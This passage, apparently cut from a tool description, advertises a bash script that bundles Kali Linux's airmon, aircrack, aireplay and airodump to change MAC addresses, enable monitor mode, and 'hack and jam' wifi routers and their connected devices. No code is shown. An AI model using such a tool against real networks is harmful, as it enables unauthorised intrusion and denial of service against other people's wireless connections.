can change your mac address, activate monitor mode, deactivate mode and also it can hack and jam wifi router and the devices 
that are connected in the wifi router. This Script is using airmon,aircrack,aireplay and airodump tool to jam and hack wifi. 
This Script is nothing but a collection of inbuilt tools in kali linux and I have just put 
the tools in bash script."
